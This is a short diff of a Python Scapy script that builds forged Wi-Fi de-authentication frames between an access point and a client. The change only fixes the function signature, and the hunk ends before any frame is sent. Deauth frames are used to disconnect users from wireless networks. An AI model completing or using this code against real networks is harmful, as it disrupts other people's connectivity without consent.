@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
 
-def construct_deauth_packets(self, cli, ap):
+def construct_deauth_packets(cli, ap):
     # De-authentication Packet For Access Point
     deauthAP = RadioTap() / Dot11(addr1=cli, addr2=ap, addr3=ap) / Dot11Deauth()
     # De-authentication Packet For Client
